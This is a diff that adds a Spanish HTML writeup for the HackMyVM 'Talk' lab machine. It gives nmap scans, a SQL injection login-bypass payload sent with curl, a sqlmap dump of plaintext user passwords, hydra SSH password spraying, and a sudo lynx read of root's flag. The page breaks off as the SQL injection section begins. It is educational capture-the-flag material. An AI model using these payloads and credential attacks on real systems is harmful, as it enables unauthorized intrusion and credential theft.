@@ -1,0 +1,1089 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Talk — HackMyVM Machine Writeup | Yoandy Ramirez Delgado</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --ink:#0b1a10;--forest:#0f2318;--pine:#163020;--moss:#1e4030;--sage:#2a6048;
+  --green:#00e87a;--green2:rgba(0,232,122,.15);--green3:rgba(0,232,122,.06);
+  --cream:#f2ede4;--cream2:#faf7f1;
+  --text:#c8f0dc;--text2:rgba(200,240,220,.65);--text3:rgba(200,240,220,.35);
+  --card:#0d2215;--card2:#112b1c;--border:rgba(0,232,122,.1);
+  --red:#f87171;--yellow:#fbbf24;--blue:#60a5fa;--purple:#a78bfa;--orange:#fb923c;--cyan:#22d3ee;
+  --bb:'Bebas Neue',sans-serif;--dm:'DM Sans',sans-serif;--mo:'JetBrains Mono',monospace;
+  --accent:#00e87a;--bg:#0b1a10;--bg2:#0f2318;--bg3:#163020;
+  --text-muted:rgba(200,240,220,.35);--text-dim:rgba(200,240,220,.65);
+  --green4:#4ade80;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--ink);color:var(--text);font-family:var(--dm);line-height:1.7;font-size:15px;}
+a{color:var(--green);text-decoration:none;}
+code{background:var(--card2);padding:.15rem .4rem;border-radius:3px;font-family:var(--mo);font-size:.88em;color:var(--green);}
+pre{margin:0;white-space:pre-wrap;word-break:break-all;font-family:var(--mo);}
+ul{padding-left:1.5rem;}li{margin:.35rem 0;}
+h2{font-family:var(--bb);font-size:1.6rem;color:var(--text);border-bottom:1px solid var(--border);padding-bottom:.5rem;margin-bottom:1.25rem;letter-spacing:.04em;}
+h3{font-size:1.05rem;color:var(--text);margin-bottom:.75rem;font-weight:600;}
+
+/* ─── HERO ─── */
+.hero{background:linear-gradient(135deg,var(--forest) 0%,var(--ink) 50%,#091a10 100%);border-bottom:1px solid var(--border);padding:60px 40px 50px;position:relative;overflow:hidden;}
+.hero::before{content:'';position:absolute;inset:0;background-image:linear-gradient(rgba(0,232,122,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,232,122,0.03) 1px,transparent 1px);background-size:56px 56px;pointer-events:none;}
+.hero-layout{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1fr 280px;gap:48px;align-items:center;}
+@media(max-width:900px){.hero-layout{grid-template-columns:1fr;}.hero-orb{order:-1;justify-self:center;}.hero-meta{justify-content:center;}.hero-sub{margin-left:auto;margin-right:auto;}.hero-stats{justify-content:center;}}
+.hero-left{position:relative;z-index:2;}
+.hero-brand{font-family:var(--mo);font-size:0.65rem;color:rgba(0,232,122,0.45);letter-spacing:0.2em;margin-bottom:16px;display:flex;align-items:center;gap:8px;}
+.hero-brand-dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 10px var(--green);animation:hpd 1.2s infinite alternate;}
+@keyframes hpd{to{opacity:0.2;transform:scale(0.5);}}
+.hero h1{font-family:var(--bb);font-size:clamp(2.4rem,4vw,3.5rem);font-weight:400;letter-spacing:0.04em;margin-bottom:14px;line-height:1;color:var(--text);}
+.hero h1 span{color:var(--green);}
+.hero-sub{color:var(--text2);font-size:0.95rem;max-width:600px;margin-bottom:24px;line-height:1.7;font-weight:300;}
+.hero-meta{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:18px;}
+.tag{display:inline-flex;align-items:center;gap:5px;padding:4px 12px;border-radius:4px;font-family:var(--mo);font-size:10px;font-weight:500;letter-spacing:0.8px;text-transform:uppercase;}
+.tag-platform{background:rgba(0,232,122,0.1);color:var(--green);border:1px solid rgba(0,232,122,0.25);}
+.tag-category{background:rgba(56,217,245,0.08);color:var(--cyan);border:1px solid rgba(56,217,245,0.2);}
+.tag-diff{background:rgba(0,232,122,0.08);color:var(--green);border:1px solid rgba(0,232,122,0.2);}
+.tag-diff-medium{background:rgba(245,166,35,0.08);color:#f5a623;border:1px solid rgba(245,166,35,0.2);}
+.tag-os{background:rgba(167,139,250,0.08);color:var(--purple);border:1px solid rgba(167,139,250,0.2);}
+.hero-stats{display:flex;gap:28px;flex-wrap:wrap;}
+.stat{display:flex;flex-direction:column;gap:2px;}
+.stat-label{font-family:var(--mo);font-size:9px;text-transform:uppercase;letter-spacing:1.5px;color:var(--text3);}
+.stat-value{font-size:1rem;font-weight:700;color:var(--text);}
+.stat-value.green{color:var(--green);}
+
+/* ─── ORB ─── */
+.hero-orb{display:flex;align-items:center;justify-content:center;position:relative;}
+.orb-w{position:relative;width:260px;height:260px;}
+.orb-w .orb-el{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;}
+.orb-ring{position:absolute;border-radius:50%;border:1px solid;animation:ors linear infinite;}
+.orb-r1{width:260px;height:260px;border-color:rgba(0,232,122,0.08);animation-duration:30s;}
+.orb-r2{width:214px;height:214px;border-color:rgba(0,232,122,0.12);animation-duration:20s;animation-direction:reverse;border-style:dashed;}
+.orb-r3{width:172px;height:172px;border-color:rgba(0,232,122,0.15);animation-duration:15s;}
+@keyframes ors{to{transform:rotate(360deg);}}
+.orb-aura{position:absolute;width:200px;height:200px;border-radius:50%;background:radial-gradient(circle,rgba(0,232,122,0.18) 0%,rgba(0,232,122,0.08) 35%,transparent 70%);animation:oap 4s ease-in-out infinite;}
+@keyframes oap{0%,100%{transform:scale(1);opacity:0.8;}50%{transform:scale(1.1);opacity:1;}}
+.orb-core{width:130px;height:130px;border-radius:50%;background:radial-gradient(circle at 38% 35%,rgba(0,232,122,0.35) 0%,rgba(15,48,32,0.8) 50%,rgba(11,26,16,0.95) 100%);border:1px solid rgba(0,232,122,0.3);box-shadow:0 0 60px rgba(0,232,122,0.2),0 0 120px rgba(0,232,122,0.08),inset 0 0 40px rgba(0,232,122,0.1);position:relative;z-index:3;display:flex;align-items:center;justify-content:center;overflow:hidden;}
+.orb-core::before{content:'';position:absolute;top:10%;left:15%;width:40%;height:30%;border-radius:50%;background:rgba(255,255,255,0.12);filter:blur(8px);}
+.orb-rune{font-family:var(--bb);font-size:2.2rem;color:rgba(0,232,122,0.7);text-shadow:0 0 30px var(--green);position:relative;z-index:2;animation:org 3s ease-in-out infinite;}
+@keyframes org{0%,100%{text-shadow:0 0 20px var(--green),0 0 40px rgba(0,232,122,0.4);}50%{text-shadow:0 0 40px var(--green),0 0 80px rgba(0,232,122,0.6);}}
+.orb-scan{position:absolute;left:0;right:0;height:1.5px;background:linear-gradient(90deg,transparent,rgba(0,232,122,0.5),transparent);animation:osc 3s linear infinite;z-index:4;pointer-events:none;}
+@keyframes osc{0%{top:5%;opacity:0;}10%{opacity:0.8;}90%{opacity:0.5;}100%{top:95%;opacity:0;}}
+.particle{position:absolute;width:3px;height:3px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:pf linear infinite}
+.p1{top:15%;left:25%;animation-duration:6s}.p2{top:25%;right:18%;animation-duration:8s;animation-delay:-2s;width:4px;height:4px}.p3{bottom:20%;left:30%;animation-duration:7s;animation-delay:-4s}.p4{bottom:30%;right:25%;animation-duration:9s;animation-delay:-1s;opacity:.6}
+@keyframes pf{0%{transform:translateY(0) scale(1);opacity:1}33%{transform:translateY(-12px) translateX(8px) scale(1.3);opacity:.7}66%{transform:translateY(-6px) translateX(-10px) scale(.8);opacity:.9}100%{transform:translateY(0) scale(1);opacity:1}}
+
+/* ─── LAYOUT ─── */
+.container{display:grid;grid-template-columns:1fr 300px;gap:2rem;max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
+@media(max-width:900px){.container{grid-template-columns:1fr;}.code-compare,.lessons-grid{grid-template-columns:1fr;}}
+
+/* ─── SECTIONS ─── */
+.section{margin:2.5rem 0;}
+.section-title{display:flex;align-items:center;gap:.75rem;margin-bottom:1.25rem;}
+.section-number{background:rgba(0,232,122,.1);color:var(--green);border:1px solid rgba(0,232,122,.25);border-radius:6px;padding:.2rem .6rem;font-family:var(--mo);font-size:.75rem;font-weight:700;}
+.step-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.step-number{font-size:.7rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:3px;margin-bottom:.4rem;font-family:var(--mo);}
+.why-box{background:rgba(0,232,122,.05);border-left:3px solid rgba(0,232,122,.4);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.why-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.why-box p{font-size:.9rem;color:var(--text2);}
+.cmd-annotated{background:rgba(5,14,8,.9);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);margin:1rem 0;border:1px solid var(--border);}
+.cmd-line{font-size:1rem;line-height:2;}
+.cmd{color:var(--green);font-weight:700;}.flag-opt{color:var(--yellow);}.ip{color:var(--orange);}.param{color:var(--cyan);}
+.user-c{color:var(--purple);}.str-c{color:var(--green);}.comment-c{color:var(--text3);}
+.cmd-notes{margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:.3rem;}
+.cmd-note{font-size:.8rem;color:var(--text2);padding:.3rem .75rem;border-left:2px solid var(--border);}
+.output-box{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);font-size:.82rem;color:var(--text2);margin:1rem 0;overflow-x:auto;line-height:1.6;}
+.output-label{font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.interpret-box{background:rgba(0,232,122,.05);border-left:3px solid var(--green);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.interpret-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.interpret-box p,.interpret-box li{font-size:.88rem;color:var(--text2);}
+.decision-box{background:rgba(251,146,60,.05);border-left:3px solid var(--orange);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.decision-box strong{color:var(--orange);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.decision-box p{font-size:.88rem;color:var(--text2);}
+.info-box{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin:1.25rem 0;}
+.info-box p{font-size:.9rem;color:var(--text2);}
+.vuln-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.vuln-card h3{color:var(--red);margin-bottom:.75rem;}
+.agent-panel{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1rem;margin:1.5rem 0;}
+@media(max-width:700px){.agent-panel{grid-template-columns:1fr;}}
+.agent-card{background:var(--card2);border-radius:10px;padding:1rem;border:1px solid var(--border);}
+.agent-card.rto{border-top:3px solid var(--orange);}
+.agent-card.bta{border-top:3px solid var(--cyan);}
+.agent-card.bhm{border-top:3px solid var(--purple);}
+.agent-label{font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.agent-card.rto .agent-label{color:var(--orange);}
+.agent-card.bta .agent-label{color:var(--cyan);}
+.agent-card.bhm .agent-label{color:var(--purple);}
+.agent-card p{font-size:.82rem;color:var(--text2);}
+.data-table{width:100%;border-collapse:collapse;font-size:.85rem;margin:1rem 0;}
+.data-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.75rem;text-transform:uppercase;}
+.data-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.data-table tr:last-child td{border-bottom:none;}
+.data-table .highlight{color:var(--green);font-weight:600;}
+.lessons-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+@media(max-width:700px){.lessons-grid{grid-template-columns:1fr;}}
+.lesson-card{background:var(--card2);border-radius:10px;padding:1.25rem;border:1px solid var(--border);}
+.lesson-card h4{font-size:.85rem;margin-bottom:.75rem;}
+.lesson-card.attacker h4{color:var(--orange);}
+.lesson-card.defender h4{color:var(--cyan);}
+.lesson-card li{font-size:.83rem;color:var(--text2);}
+.flag-box{background:linear-gradient(135deg,rgba(0,232,122,.06),rgba(0,232,122,.02));border:1px solid rgba(0,232,122,.25);border-radius:14px;padding:2rem;text-align:center;margin:2.5rem 0;}
+.flag-label{font-size:.75rem;color:var(--text3);text-transform:uppercase;letter-spacing:3px;margin-bottom:.75rem;font-family:var(--mo);}
+.flag-value{font-family:var(--mo);font-size:1.1rem;color:var(--green);background:rgba(0,232,122,.08);padding:.6rem 1.5rem;border-radius:8px;display:inline-block;border:1px solid rgba(0,232,122,.2);}
+.attack-flow{display:flex;flex-wrap:wrap;align-items:center;gap:.5rem;padding:1.25rem;background:var(--card);border:1px solid var(--border);border-radius:10px;margin:1.25rem 0;}
+.flow-step{background:var(--card2);padding:.3rem .75rem;border-radius:6px;font-family:var(--mo);font-size:.82rem;color:var(--text2);}
+.flow-step.success{background:rgba(0,232,122,.1);color:var(--green);border:1px solid rgba(0,232,122,.25);}
+.flow-step.danger{background:rgba(248,113,113,.08);color:var(--red);border:1px solid rgba(248,113,113,.2);}
+.flow-step.tunnel{background:rgba(34,211,238,.08);color:var(--cyan);border:1px solid rgba(34,211,238,.2);}
+.flow-arrow{color:var(--text3);font-size:1.1rem;}
+.cmds-summary{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;}
+.cmds-summary-title{font-size:.75rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:1.25rem;font-family:var(--mo);}
+.cmd-effective{display:flex;gap:1.25rem;align-items:flex-start;padding:1rem 0;border-bottom:1px solid var(--border);}
+.cmd-effective:last-child{border-bottom:none;}
+.cmd-num{font-family:var(--bb);font-size:2rem;color:rgba(0,232,122,.2);min-width:3rem;line-height:1;}
+.cmd-effective-body{flex:1;}
+.cmd-effective-line{font-family:var(--mo);font-size:.9rem;color:var(--text);margin-bottom:.35rem;}
+.cmd-effective-desc{font-size:.8rem;color:var(--text3);margin-bottom:.4rem;}
+.cmd-effective-output{font-family:var(--mo);font-size:.8rem;color:var(--text2);background:rgba(5,14,8,.7);padding:.4rem .75rem;border-radius:4px;border-left:2px solid var(--border);}
+
+/* ─── INLINE BADGES & HIGHLIGHTS ─── */
+.badge-red{background:rgba(248,113,113,.1);color:var(--red);border:1px solid rgba(248,113,113,.3);border-radius:4px;padding:.15rem .5rem;font-size:.78rem;font-family:var(--mo);}
+.badge-green{background:rgba(0,232,122,.1);color:var(--green);border:1px solid rgba(0,232,122,.3);border-radius:4px;padding:.15rem .5rem;font-size:.78rem;font-family:var(--mo);}
+.badge-blue{background:rgba(96,165,250,.1);color:var(--blue);border:1px solid rgba(96,165,250,.3);border-radius:4px;padding:.15rem .5rem;font-size:.78rem;font-family:var(--mo);}
+.badge-yellow{background:rgba(251,191,36,.1);color:var(--yellow);border:1px solid rgba(251,191,36,.3);border-radius:4px;padding:.15rem .5rem;font-size:.78rem;font-family:var(--mo);}
+.badge-purple{background:rgba(167,139,250,.1);color:var(--purple);border:1px solid rgba(167,139,250,.3);border-radius:4px;padding:.15rem .5rem;font-size:.78rem;font-family:var(--mo);}
+.hl-info{color:var(--cyan);font-weight:600;}
+.hl-warn{color:var(--yellow);font-weight:600;}
+.hl-flag{color:var(--green);font-weight:700;}
+.hl-red{color:var(--red);font-weight:600;}
+
+/* ─── SQLi VISUAL ─── */
+.sqli-box{background:rgba(5,14,8,.9);border-radius:12px;padding:1.5rem;margin:1.5rem 0;border:1px solid var(--border);}
+.sqli-row{margin:.75rem 0;display:flex;align-items:flex-start;gap:1rem;}
+.sqli-label{color:var(--text3);font-size:.78rem;min-width:110px;font-family:var(--mo);padding-top:.2rem;flex-shrink:0;}
+.sqli-query{font-family:var(--mo);font-size:.88rem;line-height:1.8;flex:1;}
+.q-keyword{color:var(--blue);font-weight:700;}.q-string{color:var(--green);}.q-inject{color:var(--red);font-weight:900;font-size:1.1rem;}
+.q-comment{color:var(--text3);text-decoration:line-through;opacity:.55;}.q-result{color:var(--yellow);font-size:.8rem;margin-left:.5rem;}
+.sqli-divider{border:none;border-top:1px solid var(--border);margin:.75rem 0;}
+.code-compare{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1.5rem 0;}
+.vuln-code,.safe-code{border-radius:8px;padding:1rem;border:1px solid;}
+.vuln-code{background:rgba(248,113,113,.05);border-color:rgba(248,113,113,.3);}
+.safe-code{background:rgba(0,232,122,.05);border-color:rgba(0,232,122,.3);}
+.code-header{font-size:.82rem;font-weight:700;margin-bottom:.75rem;}
+.vuln-code .code-header{color:var(--red);}.safe-code .code-header{color:var(--green);}
+.code-box{background:rgba(5,14,8,.9);border-radius:6px;padding:.75rem;font-family:var(--mo);font-size:.78rem;color:var(--text2);margin:.5rem 0;}
+.code-note{font-size:.8rem;margin-top:.5rem;}
+.vuln-code .code-note{color:var(--red);}.safe-code .code-note{color:var(--green);}
+
+/* ─── DB TABLE ─── */
+.db-table{width:100%;border-collapse:collapse;font-size:.82rem;margin:1rem 0;font-family:var(--mo);}
+.db-table th{background:var(--card2);color:var(--text3);padding:.5rem .9rem;text-align:left;font-size:.72rem;text-transform:uppercase;}
+.db-table td{padding:.5rem .9rem;border-bottom:1px solid var(--border);}
+.db-table tr:last-child td{border-bottom:none;}
+.db-table .cred-pass{color:var(--yellow);font-weight:600;}
+.db-table .cred-user{color:var(--cyan);}
+
+/* ─── SIDEBAR ─── */
+.sidebar{position:sticky;top:2rem;height:fit-content;}
+.sidebar-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
+.sidebar-card h4{margin:0 0 .9rem;font-size:.72rem;text-transform:uppercase;letter-spacing:2px;color:var(--text3);font-family:var(--mo);}
+.meta-row{display:flex;justify-content:space-between;align-items:center;font-size:.83rem;padding:.45rem 0;border-bottom:1px solid var(--border);}
+.meta-row:last-child{border-bottom:none;}
+.meta-label{color:var(--text3);}.meta-value{color:var(--text);font-weight:600;font-family:var(--mo);font-size:.8rem;}
+.mitre-tag{display:inline-block;background:rgba(167,139,250,.08);color:var(--purple);border:1px solid rgba(167,139,250,.2);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:var(--mo);margin:.2rem .15rem;}
+.score-num{font-size:2.8rem;font-weight:900;color:var(--green);text-align:center;line-height:1;margin:.5rem 0;font-family:var(--bb);}
+.score-label{text-align:center;font-size:.75rem;color:var(--text3);}
+.glosario-item{padding:.5rem 0;border-bottom:1px solid var(--border);font-size:.8rem;}
+.glosario-item:last-child{border-bottom:none;}
+.glosario-term{color:var(--cyan);font-weight:600;font-family:var(--mo);display:block;margin-bottom:.15rem;}
+.glosario-def{color:var(--text3);line-height:1.4;}
+.tool-row{display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);}
+.tool-row:last-child{border-bottom:none;}
+.tool-name{color:var(--accent);font-family:var(--mo);font-size:.75rem;min-width:90px;}
+.tool-desc{color:var(--text-muted);font-size:.75rem;}
+
+/* ─── OWASP / CWE ─── */
+.owasp-badge{background:rgba(248,113,113,.1);color:var(--red);border:1px solid rgba(248,113,113,.3);border-radius:6px;padding:.4rem .75rem;font-size:.78rem;font-weight:600;text-align:center;margin:.5rem 0;}
+</style>
+</head>
+<body>
+
+<!-- ═══ HERO ═══ -->
+<div class="hero">
+  <div class="hero-layout">
+    <div class="hero-left">
+      <div class="hero-brand"><span class="hero-brand-dot"></span>HEINDALL // WRITEUP</div>
+      <div class="hero-meta">
+        <span class="tag tag-platform">HackMyVM</span>
+        <span class="tag tag-category">Easy</span>
+        <span class="tag tag-diff">Linux</span>
+        <span class="tag tag-os">Debian 10</span>
+      </div>
+      <h1><span>Talk</span> — SQL Injection + sudo lynx</h1>
+      <p class="hero-sub">Aplicación web de chat (chatME) con SQL Injection en el formulario de login. Extracción de credenciales en texto plano mediante sqlmap, acceso SSH por password spraying y escalada de privilegios abusando del binario <code>lynx</code> con permisos sudo NOPASSWD.</p>
+      <div class="hero-stats">
+        <div class="stat"><span class="stat-label">Target</span><span class="stat-value green">10.0.2.18</span></div>
+        <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Linux</span></div>
+        <div class="stat"><span class="stat-label">Puertos</span><span class="stat-value">22, 80</span></div>
+        <div class="stat"><span class="stat-label">Tiempo</span><span class="stat-value">~15 min</span></div>
+        <div class="stat"><span class="stat-label">Vectores</span><span class="stat-value">2</span></div>
+      </div>
+    </div>
+    <div class="hero-orb">
+      <div class="orb-w">
+        <div class="orb-el">
+          <div class="orb-ring orb-r1"></div>
+          <div class="orb-ring orb-r2"></div>
+          <div class="orb-ring orb-r3"></div>
+          <div class="orb-aura"></div>
+          <div class="orb-core"><span class="orb-rune">ᚺ</span></div>
+          <div class="orb-scan"></div>
+          <div class="particle p1"></div>
+          <div class="particle p2"></div>
+          <div class="particle p3"></div>
+          <div class="particle p4"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+<main>
+
+<!-- ═══════════════════ SECUENCIA RÁPIDA ═══════════════════ -->
+<div class="section">
+  <h2>Comandos Efectivos — Secuencia Completa</h2>
+  <p style="color:var(--text-dim);font-size:.9rem;margin-bottom:1.25rem;">6 comandos que ejecutamos en orden. Cada uno con su output clave.</p>
+
+  <div class="cmds-summary">
+    <div class="cmds-summary-title">⚡ Secuencia de ataque — 6 comandos, ~15 minutos</div>
+
+    <div class="cmd-effective">
+      <div class="cmd-num">01</div>
+      <div class="cmd-effective-body">
+        <div class="cmd-effective-line">nmap -p- --open -n -T4 -sS 10.0.2.18 &amp;&amp; nmap -p22,80 -sC -sV -n 10.0.2.18</div>
+        <div class="cmd-effective-desc">Descubrir puertos y versiones — dos fases optimizadas</div>
+        <div class="cmd-effective-output">22/tcp open ssh OpenSSH 7.9p1 Debian | 80/tcp open http nginx 1.14.2 (chatME)</div>
+      </div>
+    </div>
+
+    <div class="cmd-effective">
+      <div class="cmd-num">02</div>
+      <div class="cmd-effective-body">
+        <div class="cmd-effective-line">curl -d "username=%27+OR+1%3D1--+-&password=%27+OR+1%3D1--+-" -L http://10.0.2.18/login.php</div>
+        <div class="cmd-effective-desc">Verificar SQL Injection — bypass de autenticación manual</div>
+        <div class="cmd-effective-output" style="color:var(--green);font-weight:600;">HTTP 200 → home.php como PaoPao — SQLi confirmado</div>
+      </div>
+    </div>
+
+    <div class="cmd-effective">
+      <div class="cmd-num">03</div>
+      <div class="cmd-effective-body">
+        <div class="cmd-effective-line">sqlmap -r request.txt --batch -D chat -T user --dump</div>
+        <div class="cmd-effective-desc">Extraer credenciales completas de la tabla user vía sqlmap</div>
+        <div class="cmd-effective-output">5 usuarios con contraseñas en TEXTO PLANO — david:davidwhatpass, nona:thatsmynonapass, jerry:myfriendtom...</div>
+      </div>
+    </div>
+
+    <div class="cmd-effective">
+      <div class="cmd-num">04</div>
+      <div class="cmd-effective-body">
+        <div class="cmd-effective-line">hydra -L users.txt -P pass.txt ssh://10.0.2.18 -t 4 -I</div>
+        <div class="cmd-effective-desc">Password spraying SSH con las credenciales del dump</div>
+        <div class="cmd-effective-output" style="color:var(--accent);font-weight:600;">3 credenciales válidas: nona:thatsmynonapass | david:davidwhatpass | jerry:myfriendtom</div>
+      </div>
+    </div>
+
+    <div class="cmd-effective">
+      <div class="cmd-num">05</div>
+      <div class="cmd-effective-body">
+        <div class="cmd-effective-line">ssh nona@10.0.2.18 → cat ~/user.txt &amp;&amp; sudo -l</div>
+        <div class="cmd-effective-desc">Acceso SSH + flag de usuario + enumeración sudo</div>
+        <div class="cmd-effective-output">user.txt: <span style="color:var(--green);font-weight:700;">wordsarelies</span> | sudo NOPASSWD: /usr/bin/lynx</div>
+      </div>
+    </div>
+
+    <div class="cmd-effective">
+      <div class="cmd-num">06</div>
+      <div class="cmd-effective-body">
+        <div class="cmd-effective-line">sudo lynx /root/root.txt</div>
+        <div class="cmd-effective-desc">GTFOBins — lynx lee archivos como root sin shell interactiva</div>
+        <div class="cmd-effective-output" style="color:var(--accent);font-weight:700;">root.txt: talktomeroot ✅</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════════ 1. DESCRIPCIÓN ═══════════════════ -->
+<div class="section" id="descripcion">
+  <div class="section-title">
+    <span class="section-number">1</span>
+    <h2>Descripción</h2>
+  </div>
+
+  <div class="info-box">
+    <p><strong>Talk</strong> es una máquina Linux de nivel Easy en HackMyVM. Simula un servidor de chat corporativo con una aplicación PHP (chatME) sobre nginx. El formulario de login es vulnerable a SQL Injection clásica, lo que permite extraer la base de datos completa con sqlmap. Las contraseñas están almacenadas en texto plano, facilitando el acceso SSH por credential spraying. La escalada de privilegios explota un permiso <code>sudo NOPASSWD</code> sobre el binario <code>lynx</code> — un browser de texto que puede leer archivos del sistema como root (GTFOBins).</p>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-step">SQLi bypass</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step tunnel">sqlmap dump</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step">creds plaintext</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step tunnel">Hydra SSH spray</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step">nona shell</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step success">sudo lynx → ROOT ✅</div>
+  </div>
+
+  <p style="color:var(--text-dim);font-size:.9rem;margin-top:1rem;">El nombre "Talk" hace referencia a la app de chat. Toda la cadena de ataque gira en torno a la información expuesta en esa app: las contraseñas de los usuarios del chat son las mismas que usan para SSH.</p>
+</div>
+
+<!-- ═══════════════════ 2. RECONOCIMIENTO ═══════════════════ -->
+<div class="section" id="reconocimiento">
+  <div class="section-title">
+    <span class="section-number">2</span>
+    <h2>Reconocimiento</h2>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 1 — Nmap (dos fases)</div>
+    <h3>Descubrimiento de puertos y versiones</h3>
+
+    <div class="why-box">
+      <strong>¿Por qué este comando?</strong>
+      <p>La estrategia de dos fases optimiza el tiempo: primero un escaneo rápido de todos los puertos (<code>-p- --open</code>) para identificar qué está abierto, y luego un análisis detallado (<code>-sC -sV</code>) solo en los puertos encontrados. Hacer <code>-sC -sV</code> sobre los 65535 puertos sería mucho más lento.</p>
+    </div>
+
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">nmap</span>
+        <span class="flag-opt"> -p-</span>
+        <span class="flag-opt"> --open</span>
+        <span class="flag-opt"> -n</span>
+        <span class="flag-opt"> -T4</span>
+        <span class="flag-opt"> -sS</span>
+        <span class="ip"> 10.0.2.18</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>-p-</code> → escanea los 65535 puertos TCP, no solo el top 1000</div>
+        <div class="cmd-note"><code>--open</code> → muestra solo puertos en estado OPEN</div>
+        <div class="cmd-note"><code>-n</code> → deshabilita resolución DNS (más rápido)</div>
+        <div class="cmd-note"><code>-T4</code> → plantilla agresiva: timeouts cortos, mayor velocidad</div>
+        <div class="cmd-note"><code>-sS</code> → SYN scan (semisigiloso, no completa el handshake TCP)</div>
+      </div>
+    </div>
+
+    <div class="cmd-annotated" style="margin-top:.5rem;">
+      <div class="cmd-line">
+        <span class="cmd">nmap</span>
+        <span class="flag-opt"> -p22,80</span>
+        <span class="flag-opt"> -sC</span>
+        <span class="flag-opt"> -sV</span>
+        <span class="flag-opt"> -n</span>
+        <span class="ip"> 10.0.2.18</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>-p22,80</code> → solo los puertos abiertos encontrados en Fase 1</div>
+        <div class="cmd-note"><code>-sC</code> → scripts NSE por defecto (detecta cookies, headers, títulos web)</div>
+        <div class="cmd-note"><code>-sV</code> → detecta versiones exactas de cada servicio</div>
+      </div>
+    </div>
+
+    <div class="output-box">
+      <div class="output-label">Output nmap — Fase 2</div>
+      <pre>PORT   STATE SERVICE VERSION
+<span class="hl-info">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   2048 e3:fc:1b:74:e5... (RSA)
+|   256 10:bd:60:33:a0... (ECDSA)
+<span class="hl-info">80/tcp open  http    nginx 1.14.2</span>
+| http-cookie-flags:
+|   /: PHPSESSID:
+|_    <span class="hl-warn">httponly flag not set</span>
+|_http-title: chatME
+|_http-server-header: nginx/1.14.2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</pre>
+    </div>
+
+    <div class="interpret-box">
+      <strong>¿Qué nos dice el output?</strong>
+      <ul>
+        <li><code>OpenSSH 7.9p1 Debian 10</code> → Debian Buster. Sin CVEs críticos por sí solo, pero es nuestro objetivo si encontramos credenciales</li>
+        <li><code>nginx 1.14.2</code> + título <code>chatME</code> → aplicación web PHP de chat. <span class="badge-yellow">superficie de ataque principal</span></li>
+        <li><span class="badge-red">httponly flag not set</span> → la cookie PHPSESSID es robable vía XSS — misconfiguration adicional</li>
+        <li>Solo 2 servicios = superficie reducida. El vector es claramente HTTP</li>
+      </ul>
+    </div>
+
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Puerto 80 con app PHP de chat. Investigar el formulario de login — candidato inmediato para SQL Injection.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════ 3. SQL INJECTION ═══════════════════ -->
+<div class="section" id="sqli">
